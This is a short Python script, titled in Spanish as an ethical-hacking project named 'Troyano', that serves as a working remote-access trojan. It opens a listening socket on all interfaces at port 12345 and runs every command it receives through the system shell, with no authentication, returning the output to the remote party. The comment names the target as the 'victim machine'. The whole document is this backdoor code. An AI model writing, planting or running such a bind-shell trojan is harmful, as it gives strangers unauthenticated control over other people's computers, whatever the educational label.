'''
PROYECTOS DE HACKING ETICO WITH PYTHON
TROYANO
'''

# Permite el control remoto sobre la máquina víctima.

import socket
import subprocess

# Función para manejar comandos entrantes
def execute_command(command):
    return subprocess.check_output(command, shell=True).decode()

# Iniciar el servidor troyano
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(("0.0.0.0", 12345))
server_socket.listen(1)
conn, addr = server_socket.accept()
while True:
    command = conn.recv(1024).decode()
    if command == "exit":
        break
    output = execute_command(command)
    conn.send(output.encode())